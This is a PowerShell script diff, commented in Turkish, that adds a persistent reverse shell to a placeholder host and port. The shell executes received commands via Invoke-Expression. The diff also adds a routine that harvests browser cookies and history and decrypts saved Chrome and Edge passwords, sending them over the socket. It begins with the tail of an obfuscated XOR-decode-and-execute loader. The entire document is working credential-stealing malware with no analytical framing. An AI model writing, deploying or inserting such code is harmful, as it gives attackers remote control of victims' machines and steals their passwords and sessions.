$oDRcAv.Length;$i++){$oDRcAv[$i]-bxor $Fybydy}; $KgEJsV=[System.Text.Encoding]::Unicode.GetString($TNljyB); 1..1|ForEach-Object{IEX $KgEJsV}
+$server = "10.10.10.10"  # <-- IP'ni değiştir
+$port = 9001             # <-- Portunu değiştir
 
+function Connect-ReverseShell {
+    while ($true) {
+        try {
+            $client = New-Object Net.Sockets.TCPClient($server, $port)
+            $stream = $client.GetStream()
+            $reader = New-Object IO.StreamReader($stream)
+            $writer = New-Object IO.StreamWriter($stream)
+            $writer.AutoFlush = $true
+
+            $writer.WriteLine("[+] Connected from $env:COMPUTERNAME ($env:USERNAME)")
+
+            # Browser verilerini çek ve gönder
+            Send-BrowserData $writer
+
+            while ($client.Connected) {
+                try {
+                    $cmd = $reader.ReadLine()
+                    if ($null -eq $cmd) { break }
+
+                    if ($cmd -eq "exit" -or $cmd -eq "quit") {
+                        $writer.WriteLine("[+] Goodbye!")
+                        break
+                    }
+
+                    $output = Invoke-Expression $cmd 2>&1 | Out-String
+                    $writer.WriteLine($output)
+                }
+                catch {
+                    $writer.WriteLine("ERROR: $($_.Exception.Message)")
+                }
+            }
+        }
+        catch {
+            # Bağlantı hatası olursa sessizce bekle ve tekrar dene
+        }
+        finally {
+            if ($client) { $client.Close() }
+            Start-Sleep -Seconds 10  # 10 saniye sonra tekrar bağlan
+        }
+    }
+}
+
+function Send-BrowserData {
+    param($writer)
+
+    $writer.WriteLine("`n[*] Tarayici verileri toplanıyor...`n")
+
+    $browsers = @(
+        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
+        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"},
+        @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles"}
+    )
+
+    foreach ($browser in $browsers) {
+        try {
+            if (Test-Path $browser.Path) {
+                $writer.WriteLine("[+] $($browser.Name) bulundu")
+
+                # Cookies
+                $cookiePaths = @()
+                if ($browser.Name -eq "Firefox") {
+                    $profiles = Get-ChildItem "$($browser.Path)\*.default-release" -Directory
+                    foreach ($p in $profiles) { $cookiePaths += "$($p.FullName)\cookies.sqlite" }
+                } else {
+                    $cookiePaths += "$($browser.Path)\Network\Cookies"
+                }
+
+                foreach ($cp in $cookiePaths) {
+                    if (Test-Path $cp) {
+                        Copy-Item $cp "$env:TEMP\cookies_$(Get-Random).tmp" -Force
+                        $size = (Get-Item "$env:TEMP\cookies_*.tmp").Length
+                        $writer.WriteLine("    Cookie DB: $cp (boyut: $size bytes)")
+                        Remove-Item "$env:TEMP\cookies_*.tmp" -Force
+                    }
+                }
+
+                # Login Data (şifreler)
+                $loginPath = "$($browser.Path)\Login Data"
+                if (Test-Path $loginPath -and $browser.Name -ne "Firefox") {
+                    Copy-Item $loginPath "$env:TEMP\logins.tmp" -Force
+                    try {
+                        $conn = New-Object Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\logins.tmp")
+                        $conn.Open()
+                        $cmd = $conn.CreateCommand()
+                        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                        $r = $cmd.ExecuteReader()
+                        $count = 0
+                        while ($r.Read()) {
+                            $url = $r.GetString(0)
+                            $user = $r.GetString(1)
+                            $encPass = $r.GetValue(2)
+                            try {
+                                $decPass = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object Security.SecureString)))
+                                # DPAPI decrypt (Chrome/Edge)
+                                $decPass = [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser'))
+                                $writer.WriteLine("    Şifre: $url | $user | $decPass")
+                                $count++
+                            } catch {}
+                        }
+                        $r.Close()
+                        $conn.Close()
+                        if ($count -eq 0) { $writer.WriteLine("    Kaydedilmiş şifre yok veya decrypt edilemedi") }
+                    } catch {
+                        $writer.WriteLine("    Login Data okunamadı (kilitli olabilir)")
+                    }
+                    Remove-Item "$env:TEMP\logins.tmp" -Force
+                }
+
+                # History
+                $historyPath = "$($browser.Path)\History"
+                if (Test-Path $historyPath -and $browser.Name -ne "Firefox") {
+                    Copy-Item $historyPath "$env:TEMP\history.tmp" -Force
+                    $writer.WriteLine("    History DB bulundu")
+                    Remove-Item "$env:TEMP\history.tmp" -Force
+                }
+            }
+        } catch {
+            $writer.WriteLine("[-] $($browser.Name) hatası: $($_.Exception.Message)")
+        }
+    }
+
+    $writer.WriteLine("`n[*] Tarayici verileri toplama tamamlandı.`n")
+}
+
+Connect-ReverseShell
